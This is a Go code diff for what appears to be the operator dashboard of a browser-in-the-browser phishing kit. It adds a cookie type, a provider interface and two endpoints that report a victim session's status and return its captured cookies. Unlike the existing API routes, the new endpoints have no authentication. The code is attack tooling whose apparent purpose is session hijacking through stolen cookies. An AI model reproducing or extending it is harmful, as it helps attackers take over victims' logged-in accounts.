@@ -15,11 +15,26 @@ import (
 //go:embed index.html
 var indexHTML string
 
+type BitbCookie struct {
+	Name     string `json:"name"`
+	Value    string `json:"value"`
+	Domain   string `json:"domain"`
+	Path     string `json:"path"`
+	Secure   bool   `json:"secure"`
+	HttpOnly bool   `json:"httpOnly"`
+}
+
+type BitbStatusProvider interface {
+	GetStatus(sessionId string) (string, int, error)
+	GetCookies(sessionId string) ([]BitbCookie, error)
+}
+
 type Dashboard struct {
-	db        *database.Database
-	authToken string
-	port      int
-	srv       *http.Server
+	db             *database.Database
+	authToken      string
+	port           int
+	srv            *http.Server
+	bitbProvider   BitbStatusProvider
 }
 
 type apiSession struct {
@@ -46,6 +61,49 @@ type cookieTokenItem struct {
 	HttpOnly bool   `json:"httpOnly"`
 }
 
+func (d *Dashboard) handleBitbStatus(w http.ResponseWriter, r *http.Request) {
+	if d.bitbProvider == nil {
+		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "bitb not available"})
+		return
+	}
+	sid := strings.TrimPrefix(r.URL.Path, "/bitb/status/")
+	if sid == "" {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing session id"})
+		return
+	}
+	status, count, err := d.bitbProvider.GetStatus(sid)
+	if err != nil {
+		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"status":       status,
+		"cookie_count": count,
+	})
+}
+
+func (d *Dashboard) handleBitbCookies(w http.ResponseWriter, r *http.Request) {
+	if d.bitbProvider == nil {
+		writeJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "bitb not available"})
+		return
+	}
+	sid := strings.TrimPrefix(r.URL.Path, "/bitb/cookies/")
+	if sid == "" {
+		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "missing session id"})
+		return
+	}
+	cookies, err := d.bitbProvider.GetCookies(sid)
+	if err != nil {
+		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]interface{}{
+		"session_id": sid,
+		"cookies":    cookies,
+		"count":      len(cookies),
+	})
+}
+
 func New(db *database.Database, authToken string, port int) *Dashboard {
 	return &Dashboard{
 		db:        db,
@@ -54,11 +112,17 @@ func New(db *database.Database, authToken string, port int) *Dashboard {
 	}
 }
 
+func (d *Dashboard) SetBitbProvider(p BitbStatusProvider) {
+	d.bitbProvider = p
+}
+
 func (d *Dashboard) Start() error {
 	mux := http.NewServeMux()
 
 	mux.HandleFunc("/api/sessions", d.corsMiddleware(d.authMiddleware(d.handleSessions)))
 	mux.HandleFunc("/api/sessions/", d.corsMiddleware(d.authMiddleware(d.handleSessionByID)))
+	mux.HandleFunc("/bitb/status/", d.corsMiddleware(d.handleBitbStatus))
+	mux.HandleFunc("/bitb/cookies/", d.corsMiddleware(d.handleBitbCookies))
 	mux.HandleFunc("/", d.corsMiddleware(d.handleFrontend))
 
 	d.srv = &http.Server{
